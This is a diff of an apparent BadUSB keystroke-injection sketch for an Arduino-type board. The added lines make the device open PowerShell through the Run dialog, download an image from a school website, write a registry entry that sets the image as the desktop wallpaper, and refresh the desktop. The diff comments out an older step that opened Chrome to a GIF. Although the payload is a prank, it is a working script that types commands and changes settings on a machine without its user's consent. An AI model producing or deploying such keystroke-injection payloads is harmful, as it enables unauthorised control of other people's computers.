@@ -26,12 +26,17 @@ void setup() {
   Keyboard.release(KEY_R);
   Keyboard.release(MODIFIERKEY_GUI);
   delay(200);
+  Keyboard.print("powershell");
   Keyboard.press(KEY_ENTER);
   Keyboard.release(KEY_ENTER);
   delay(200);
-  Keyboard.print("start chrome.exe https://static.hitek.fr/img/up_m/721767544/griezmann.gif");
-  Keyboard.press(KEY_ENTER);
-  Keyboard.release(KEY_ENTER);
+  Keyboard.println("Invoke-WebRequest -Uri https://icn.lycee-valin.fr/projets2017/seconde13/eleve13/images/imaget.bmp -OutFile C:\temp\grizou.bmp");
+  delay(1000);
+  Keyboard.println("reg add 'HKCU\Control Panel\Desktop' /v Wallpaper /t REG_SZ /d C:\temp\grizou.bmp /f");
+  Keyboard.println("rundll32.exe User32.dll,UpdatePerUserSystemParameters");
+
+  //Keyboard.print("start chrome.exe https://static.hitek.fr/img/up_m/721767544/griezmann.gif");
+  // reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\temp\grizou.bmp" /f & rundll32.exe User32.dll,UpdatePerUserSystemParameters
 }
 
 void loop() {
